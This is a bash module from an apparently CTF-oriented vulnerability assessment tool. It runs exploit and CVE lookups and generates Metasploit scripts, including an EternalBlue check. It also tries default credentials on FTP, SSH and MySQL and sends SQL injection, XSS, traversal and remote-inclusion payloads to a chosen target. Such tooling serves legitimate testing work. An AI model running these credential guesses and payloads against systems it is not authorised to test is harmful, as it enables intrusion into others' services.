#!/bin/bash

# Exploit search and vulnerability assessment module

source "$(dirname "${BASH_SOURCE[0]}")/utils.sh"

# Search for exploits using searchsploit
search_exploits() {
    local service=$1
    local version=$2
    local output_file="$SCAN_DIR/exploits/searchsploit_${service}.txt"
    
    log "INFO" "Searching exploits for $service $version"
    
    if command -v searchsploit &>/dev/null; then
        # Search for service-specific exploits
        searchsploit "$service" > "$output_file" 2>/dev/null
        
        # Search for version-specific exploits if version is provided
        if [[ -n "$version" ]]; then
            searchsploit "$service $version" >> "$output_file" 2>/dev/null
        fi
        
        if [[ -s "$output_file" ]]; then
            local exploit_count=$(wc -l < "$output_file")
            log "FINDING" "Found $exploit_count potential exploits for $service"
            
            # Extract interesting exploits
            grep -i "remote\|privilege\|escalation\|rce\|code execution" "$output_file" | head -5 | while read exploit; do
                log "FINDING" "Interesting exploit: $exploit"
            done
        fi
    else
        log "WARN" "searchsploit not available"
    fi
}

# CVE search for known vulnerabilities
search_cves() {
    local service=$1
    local version=$2
    
    log "INFO" "Searching CVEs for $service $version"
    
    # Create a simple CVE database lookup (this would be enhanced with actual CVE API)
    local cve_file="$SCAN_DIR/exploits/cves_${service}.txt"
    
    # Common CVEs for popular services (this is a simplified example)
    case $service in
        "apache")
            if [[ $version =~ 2\.4\.[0-9]+ ]]; then
                echo "CVE-2021-41773 - Apache HTTP Server Path Traversal" >> "$cve_file"
                echo "CVE-2021-42013 - Apache HTTP Server Path Traversal and RCE" >> "$cve_file"
            fi
            ;;
        "nginx")
            if [[ $version =~ 1\.[0-9]+\.[0-9]+ ]]; then
                echo "CVE-2017-7529 - Nginx Range Filter Integer Overflow" >> "$cve_file"
            fi
            ;;
        "openssh")
            if [[ $version =~ [1-7]\.[0-9]+ ]]; then
                echo "CVE-2020-14145 - OpenSSH Observable Discrepancy" >> "$cve_file"
                echo "CVE-2018-15473 - OpenSSH User Enumeration" >> "$cve_file"
            fi
            ;;
        "samba")
            echo "CVE-2017-7494 - Samba Remote Code Execution (SambaCry)" >> "$cve_file"
            echo "CVE-2020-1472 - Netlogon Elevation of Privilege (Zerologon)" >> "$cve_file"
            ;;
    esac
    
    if [[ -f "$cve_file" && -s "$cve_file" ]]; then
        log "FINDING" "Potential CVEs found for $service:"
        while read cve; do
            log "FINDING" "$cve"
        done < "$cve_file"
    fi
}

# Generate Metasploit commands
generate_msf_commands() {
    local target=$1
    local service=$2
    local port=$3
    local version=$4
    
    local msf_file="$SCAN_DIR/exploits/metasploit_${service}_${port}.rc"
    
    log "INFO" "Generating Metasploit commands for $service"
    
    case $service in
        "ftp")
            cat > "$msf_file" << EOF
# FTP Exploitation Commands
use auxiliary/scanner/ftp/anonymous
set RHOSTS $target
set RPORT $port
run

use auxiliary/scanner/ftp/ftp_login
set RHOSTS $target
set RPORT $port
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
run
EOF
            ;;
        "ssh")
            cat > "$msf_file" << EOF
# SSH Exploitation Commands
use auxiliary/scanner/ssh/ssh_login
set RHOSTS $target
set RPORT $port
set USERNAME root
set PASSWORD root
run

use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS $target
set RPORT $port
run
EOF
            ;;
        "http"|"https")
            cat > "$msf_file" << EOF
# Web Application Exploitation Commands
use auxiliary/scanner/http/dir_scanner
set RHOSTS $target
set RPORT $port
run

use auxiliary/scanner/http/http_login
set RHOSTS $target
set RPORT $port
set TARGETURI /admin
run

use auxiliary/scanner/http/files_dir
set RHOSTS $target
set RPORT $port
run
EOF
            ;;
        "smb")
            cat > "$msf_file" << EOF
# SMB Exploitation Commands
use auxiliary/scanner/smb/smb_version
set RHOSTS $target
set RPORT $port
run

use auxiliary/scanner/smb/smb_enumshares
set RHOSTS $target
set RPORT $port
run

use auxiliary/scanner/smb/smb_login
set RHOSTS $target
set RPORT $port
set SMBUser guest
set SMBPass ""
run

# EternalBlue (if Windows)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $target
set RPORT $port
check
EOF
            ;;
        "mysql")
            cat > "$msf_file" << EOF
# MySQL Exploitation Commands
use auxiliary/scanner/mysql/mysql_login
set RHOSTS $target
set RPORT $port
set USERNAME root
set PASSWORD ""
run

use auxiliary/scanner/mysql/mysql_version
set RHOSTS $target
set RPORT $port
run

use auxiliary/admin/mysql/mysql_enum
set RHOSTS $target
set RPORT $port
run
EOF
            ;;
    esac
    
    if [[ -f "$msf_file" ]]; then
        log "FINDING" "Metasploit commands generated: $msf_file"
    fi
}

# Check for default credentials
check_default_credentials() {
    local target=$1
    local service=$2
    local port=$3
    
    log "INFO" "Checking default credentials for $service"
    
    local creds_file="$SCAN_DIR/exploits/default_creds_${service}.txt"
    
    case $service in
        "ftp")
            echo "Checking FTP default credentials..." > "$creds_file"
            local ftp_creds=("anonymous:" "ftp:ftp" "admin:admin" "root:root")
            for cred in "${ftp_creds[@]}"; do
                local user=$(echo "$cred" | cut -d':' -f1)
                local pass=$(echo "$cred" | cut -d':' -f2)
                
                if timeout 10 ftp -n "$target" <<< "user $user $pass
quit" 2>/dev/null | grep -q "230"; then
                    log "FINDING" "FTP default credentials work: $user:$pass"
                    echo "SUCCESS: $user:$pass" >> "$creds_file"
                fi
            done
            ;;
        "ssh")
            echo "Checking SSH default credentials..." > "$creds_file"
            local ssh_creds=("root:root" "admin:admin" "root:toor" "pi:raspberry")
            for cred in "${ssh_creds[@]}"; do
                local user=$(echo "$cred" | cut -d':' -f1)
                local pass=$(echo "$cred" | cut -d':' -f2)
                
                if timeout 10 sshpass -p "$pass" ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no "$user@$target" -p "$port" "echo success" 2>/dev/null | grep -q "success"; then
                    log "FINDING" "SSH default credentials work: $user:$pass"
                    echo "SUCCESS: $user:$pass" >> "$creds_file"
                fi
            done
            ;;
        "mysql")
            echo "Checking MySQL default credentials..." > "$creds_file"
            local mysql_creds=("root:" "root:root" "root:password" "admin:admin")
            for cred in "${mysql_creds[@]}"; do
                local user=$(echo "$cred" | cut -d':' -f1)
                local pass=$(echo "$cred" | cut -d':' -f2)
                
                if timeout 10 mysql -h "$target" -P "$port" -u "$user" -p"$pass" -e "SELECT 1;" 2>/dev/null | grep -q "1"; then
                    log "FINDING" "MySQL default credentials work: $user:$pass"
                    echo "SUCCESS: $user:$pass" >> "$creds_file"
                fi
            done
            ;;
    esac
}

# Web vulnerability scanning
scan_web_vulns() {
    local target=$1
    local port=$2
    local protocol=${3:-http}
    
    local base_url="$protocol://$target:$port"
    
    log "INFO" "Scanning web vulnerabilities on $base_url"
    
    # SQL injection testing
    test_sql_injection "$base_url"
    
    # XSS testing
    test_xss "$base_url"
    
    # Directory traversal testing
    test_directory_traversal "$base_url"
    
    # File inclusion testing
    test_file_inclusion "$base_url"
}

# Basic SQL injection testing
test_sql_injection() {
    local base_url=$1
    local sqli_file="$SCAN_DIR/exploits/sqli_test.txt"
    
    log "INFO" "Testing for SQL injection"
    
    # Common SQL injection payloads
    local payloads=("'" "1' OR '1'='1" "admin'--" "' UNION SELECT 1,2,3--")
    
    # Test common parameters
    local params=("id" "user" "username" "login" "page" "cat" "category")
    
    for param in "${params[@]}"; do
        for payload in "${payloads[@]}"; do
            local test_url="$base_url/?$param=$(url_encode "$payload")"
            local response=$(curl -s --connect-timeout 10 "$test_url" 2>/dev/null)
            
            # Look for SQL error messages
            if echo "$response" | grep -qi "sql\|mysql\|oracle\|postgresql\|sqlite\|error\|warning"; then
                log "FINDING" "Potential SQL injection in parameter '$param'"
                echo "URL: $test_url" >> "$sqli_file"
                echo "Response contains SQL errors" >> "$sqli_file"
                break
            fi
        done
    done
}

# Basic XSS testing
test_xss() {
    local base_url=$1
    local xss_file="$SCAN_DIR/exploits/xss_test.txt"
    
    log "INFO" "Testing for XSS vulnerabilities"
    
    # Simple XSS payloads
    local payloads=("<script>alert('XSS')</script>" "<img src=x onerror=alert('XSS')>")
    local params=("q" "search" "name" "comment" "message")
    
    for param in "${params[@]}"; do
        for payload in "${payloads[@]}"; do
            local test_url="$base_url/?$param=$(url_encode "$payload")"
            local response=$(curl -s --connect-timeout 10 "$test_url" 2>/dev/null)
            
            if echo "$response" | grep -q "$payload"; then
                log "FINDING" "Potential XSS vulnerability in parameter '$param'"
                echo "URL: $test_url" >> "$xss_file"
            fi
        done
    done
}

# Directory traversal testing
test_directory_traversal() {
    local base_url=$1
    local lfi_file="$SCAN_DIR/exploits/directory_traversal.txt"
    
    log "INFO" "Testing for directory traversal"
    
    # Directory traversal payloads
    local payloads=("../../../etc/passwd" "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts" "....//....//....//etc/passwd")
    local params=("file" "page" "include" "path" "doc")
    
    for param in "${params[@]}"; do
        for payload in "${payloads[@]}"; do
            local test_url="$base_url/?$param=$(url_encode "$payload")"
            local response=$(curl -s --connect-timeout 10 "$test_url" 2>/dev/null)
            
            if echo "$response" | grep -q "root:x:\|daemon:\|Administrator"; then
                log "FINDING" "Potential directory traversal in parameter '$param'"
                echo "URL: $test_url" >> "$lfi_file"
            fi
        done
    done
}

# File inclusion testing
test_file_inclusion() {
    local base_url=$1
    local fi_file="$SCAN_DIR/exploits/file_inclusion.txt"
    
    log "INFO" "Testing for file inclusion vulnerabilities"
    
    # Remote file inclusion test
    local rfi_payload="http://example.com/test.txt"
    local params=("file" "page" "include" "url")
    
    for param in "${params[@]}"; do
        local test_url="$base_url/?$param=$rfi_payload"
        local response=$(curl -s --connect-timeout 10 "$test_url" 2>/dev/null)
        
        # Check for signs of attempted remote inclusion
        if echo "$response" | grep -qi "failed to open stream\|connection refused\|could not resolve"; then
            log "FINDING" "Potential RFI vulnerability in parameter '$param'"
            echo "URL: $test_url" >> "$fi_file"
        fi
    done
}

# Generate exploit summary
generate_exploit_summary() {
    local target=$1
    local summary_file="$SCAN_DIR/exploit_summary.txt"
    
    echo "Exploit Summary for $target" > "$summary_file"
    echo "=============================" >> "$summary_file"
    echo "Generated: $(date)" >> "$summary_file"
    echo "" >> "$summary_file"
    
    # Summarize findings
    echo "=== POTENTIAL EXPLOITS ===" >> "$summary_file"
    find "$SCAN_DIR/exploits" -name "*.txt" -exec grep -l "FINDING\|SUCCESS" {} \; | while read file; do
        echo "File: $(basename "$file")" >> "$summary_file"
        grep "FINDING\|SUCCESS" "$file" >> "$summary_file" 2>/dev/null
        echo "" >> "$summary_file"
    done
    
    echo "=== METASPLOIT COMMANDS ===" >> "$summary_file"
    find "$SCAN_DIR/exploits" -name "*.rc" | while read file; do
        echo "File: $(basename "$file")" >> "$summary_file"
        echo "Command: msfconsole -r $file" >> "$summary_file"
        echo "" >> "$summary_file"
    done
    
    log "SUCCESS" "Exploit summary generated: $summary_file"
}

# Nuclei vulnerability scanner
run_nuclei_scan() {
    local target=$1
    local nuclei_dir="$SCAN_DIR/vulnerabilities"
    local nuclei_output="$nuclei_dir/nuclei_results.txt"
    local nuclei_json="$nuclei_dir/nuclei_results.json"
    
    log "INFO" "Starting Nuclei vulnerability scan"
    
    # Ensure vulnerabilities directory exists
    if [[ ! -d "$nuclei_dir" ]]; then
        mkdir -p "$nuclei_dir"
        log "INFO" "Created vulnerabilities directory: $nuclei_dir"
    fi
    
    if command -v nuclei &>/dev/null; then
        # Update nuclei templates
        log "INFO" "Updating Nuclei templates..."
        nuclei -update-templates -silent 2>/dev/null || log "WARN" "Failed to update nuclei templates"
        
        # Create target list for nuclei
        local target_list="$nuclei_dir/targets.txt"
        
        # Add HTTP/HTTPS targets based on open ports
        if [[ -f "$SCAN_DIR/nmap/quick_scan.txt" ]]; then
            # Extract web ports and create URLs
            grep -E "80/tcp|443/tcp|8080/tcp|8443/tcp|8000/tcp|8888/tcp|9000/tcp" "$SCAN_DIR/nmap/quick_scan.txt" | while read -r line; do
                if [[ $line =~ ^([0-9]+)/tcp.*open ]]; then
                    local port="${BASH_REMATCH[1]}"
                    case $port in
                        443|8443)
                            echo "https://$target:$port" >> "$target_list"
                            ;;
                        *)
                            echo "http://$target:$port" >> "$target_list"
                            ;;
                    esac
                fi
            done
        fi
        
        # Add basic target if no web ports found
        if [[ ! -f "$target_list" || ! -s "$target_list" ]]; then
            echo "http://$target" >> "$target_list"
            echo "https://$target" >> "$target_list"
        fi
        
        if [[ -f "$target_list" && -s "$target_list" ]]; then
            log "INFO" "Running Nuclei scan on $(wc -l < "$target_list") targets"
            
            # Run nuclei with CTF-focused templates
            nuclei -l "$target_list" \
                -t cves/ \
                -t vulnerabilities/ \
                -t misconfiguration/ \
                -t default-logins/ \
                -t exposures/ \
                -t takeovers/ \
                -t exposed-panels/ \
                -severity low,medium,high,critical \
                -o "$nuclei_output" \
                -json-export "$nuclei_json" \
                -silent \
                -rate-limit 50 \
                -timeout 10 \
                -retries 1 \
                -no-color 2>/dev/null || log "WARN" "Nuclei scan completed with warnings"
            
            if [[ -f "$nuclei_output" && -s "$nuclei_output" ]]; then
                local vuln_count=$(wc -l < "$nuclei_output")
                log "SUCCESS" "Nuclei found $vuln_count potential vulnerabilities"
                
                # Extract critical and high severity findings
                if grep -q "\[critical\]\|\[high\]" "$nuclei_output" 2>/dev/null; then
                    log "FINDING" "Critical/High severity vulnerabilities found!"
                    grep "\[critical\]\|\[high\]" "$nuclei_output" | head -5 | while read -r vuln; do
                        log "FINDING" "High Priority: $vuln"
                    done
                fi
                
                # Extract interesting findings for CTF
                grep -i "login\|admin\|config\|backup\|flag\|secret" "$nuclei_output" 2>/dev/null | head -3 | while read -r finding; do
                    log "FINDING" "Interesting: $finding"
                done
                
            else
                log "INFO" "No vulnerabilities found by Nuclei"
            fi
        else
            log "WARN" "No valid targets found for Nuclei scan"
        fi
    else
        log "WARN" "Nuclei not available. Install with: go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest"
        return 1
    fi
    
    log "SUCCESS" "Nuclei vulnerability scan completed"
}

# Main exploit search function
run_exploit_search() {
    local target=$1
    local services_file="$SCAN_DIR/nmap/service_scan.txt"
    
    log "INFO" "Starting exploit search and vulnerability assessment"
    
    # Ensure exploits directory exists
    if [[ ! -d "$SCAN_DIR/exploits" ]]; then
        mkdir -p "$SCAN_DIR/exploits"
        log "INFO" "Created exploits directory: $SCAN_DIR/exploits"
    fi
    
    if [[ ! -f "$services_file" ]]; then
        log "WARN" "No service scan results found. Using quick scan results."
        services_file="$SCAN_DIR/nmap/quick_scan.txt"
    fi
    
    if [[ ! -f "$services_file" ]]; then
        log "ERROR" "No scan results found. Run port scan first."
        return 1
    fi
    
    # Parse services and search for exploits
    while read -r line; do
        if [[ $line =~ ^([0-9]+)/tcp.*open.*([a-zA-Z0-9-]+) ]]; then
            local port="${BASH_REMATCH[1]}"
            local service="${BASH_REMATCH[2]}"
            
            # Extract version if available
            local version=$(echo "$line" | grep -oE '[0-9]+\.[0-9]+(\.[0-9]+)?')
            
            log "INFO" "Analyzing $service on port $port"
            
            # Search for exploits
            search_exploits "$service" "$version"
            
            # Search for CVEs
            search_cves "$service" "$version"
            
            # Generate Metasploit commands
            generate_msf_commands "$target" "$service" "$port" "$version"
            
            # Check default credentials
            check_default_credentials "$target" "$service" "$port"
            
            # Web-specific vulnerability testing
            if [[ $service =~ ^(http|https)$ ]]; then
                scan_web_vulns "$target" "$port" "$service"
            fi
        fi
    done < "$services_file"
    
    # Generate summary
    generate_exploit_summary "$target"
    
    log "SUCCESS" "Exploit search completed"
}
